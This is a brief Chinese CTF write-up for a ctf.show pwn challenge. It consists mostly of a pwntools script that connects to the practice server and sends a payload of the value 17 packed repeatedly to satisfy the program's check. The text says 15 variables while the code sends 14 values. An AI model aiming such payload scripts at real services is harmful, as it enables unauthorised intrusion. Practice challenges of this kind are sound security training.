# 挑战简介
满足一定条件即可

# 思路
满足条件，将15个变量全部设置成17即可  

```
from pwn import *
from LibcSearcher import *
context(arch = "amd64",os = 'linux',log_level = 'debug')

#context(arch = "i386",os = 'linux',log_level = 'debug')

#io = process("./pwn")

io = remote('pwn.challenge.ctf.show',28272)

elf = ELF('D:\edge 下载\pwn')

payload = p32(17) * 0xE

io.recv()

io.sendline(payload)

io.interactive()
```
